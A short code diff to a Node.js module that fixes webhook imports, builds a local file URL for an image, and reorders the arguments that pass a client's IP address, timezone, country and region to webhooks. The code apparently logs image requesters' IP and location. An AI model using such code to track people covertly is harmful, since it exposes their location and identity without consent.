@@ -1,6 +1,6 @@
+const path = require('path')
 const logger = require('./logger')
-const sendImageToWebhooks = require('./webhook')
-const sendImageToWebhooksGithub = require('./webhook')
+const { sendImageToWebhooks, sendImageToWebhooksGithub } = require('./webhook')
 
 const config = require('./config.json')
 
@@ -43,7 +43,10 @@ const ipInfo = async (
 
       let url
       try {
-        url = new URL(imageName)
+        const scriptPath = path.dirname(__filename)
+        const absoluteImagePath = path.join(scriptPath, imageUrl)
+        const fileUrl = `file://${absoluteImagePath}`
+        url = new URL(fileUrl)
       } catch (error) {
         logger.error(`Invalid image URL: ${error}`)
         return
@@ -57,8 +60,8 @@ const ipInfo = async (
         sendImageToWebhooks(
           imageName,
           imageUrl,
-          clientIP,
           url,
+          clientIP,
           timezone,
           country,
           regionName,
